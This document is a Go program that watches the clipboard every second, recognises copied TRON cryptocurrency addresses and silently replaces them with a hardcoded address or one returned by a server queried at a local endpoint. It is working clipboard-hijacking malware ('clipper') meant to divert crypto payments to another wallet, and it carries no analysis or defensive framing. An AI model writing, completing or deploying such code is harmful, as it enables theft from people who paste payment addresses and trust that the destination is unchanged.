package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"regexp"
	"strings"
	"time"

	"github.com/atotto/clipboard"
	"github.com/fbsobreira/gotron-sdk/pkg/address"
)

var (
	DefaultAddress = "Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" // 默认地址
	Enable         = false                                //是否启用
)

type ResponseAddress struct {
	Address string `json:"address"`
}

func main() {
	processedAddresses := make(map[string]bool) // 用于跟踪已处理的地址

	// 启动剪贴板监听
	for {
		// 获取剪贴板内容
		content, err := clipboard.ReadAll()
		if err != nil {
			fmt.Println("剪贴板读取失败:", err)
			return
		}

		// 检查内容并进行相应操作
		if strings.HasPrefix(content, "T") {
			regex := regexp.MustCompile(`^(T[1-9A-HJ-NP-Za-km-z]{33})$`)
			matches := regex.FindStringSubmatch(content)
			if len(matches) > 1 {
				tronAddress := matches[1]
				if IsTronAddress(tronAddress) {
					// 检查地址是否已处理过
					if processed, exists := processedAddresses[tronAddress]; exists && processed {
						continue // 如果地址已处理，继续下一次迭代
					}

					if Enable {
						err := clipboard.WriteAll(DefaultAddress)
						if err != nil {
							fmt.Println("剪贴板写入失败:", err)
						}
					} else {
						newAddress := GetAddress(tronAddress)
						if newAddress != "" {
							err := clipboard.WriteAll(newAddress)
							if err != nil {
								fmt.Println("剪贴板写入失败:", err)
							}
							processedAddresses[tronAddress] = true // 标记地址已成功处理
						}
					}
				} else {
					return
				}
			} else {
				return
			}
		}
		// 等待一段时间再次检查
		time.Sleep(1 * time.Second)
	}
}

// IsTronAddress 检查是否是一个合法的地址
func IsTronAddress(useraddress string) bool {
	_, err := address.Base58ToAddress(useraddress)
	return err == nil
}

// 向远程服务器发送GET请求
func GetAddress(address string) string {
	url := "http://localhost:7777/v1/getadress?address=" + address

	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		fmt.Println("创建请求失败:", err)
		return DefaultAddress
	}

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Println("请求失败:", err)
		return DefaultAddress
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("读取响应失败:", err)
		return DefaultAddress
	}

	var responseAddress ResponseAddress
	err = json.Unmarshal(body, &responseAddress)
	if err != nil {
		fmt.Println("解析json失败:", err)
		return DefaultAddress
	}

	return responseAddress.Address
}
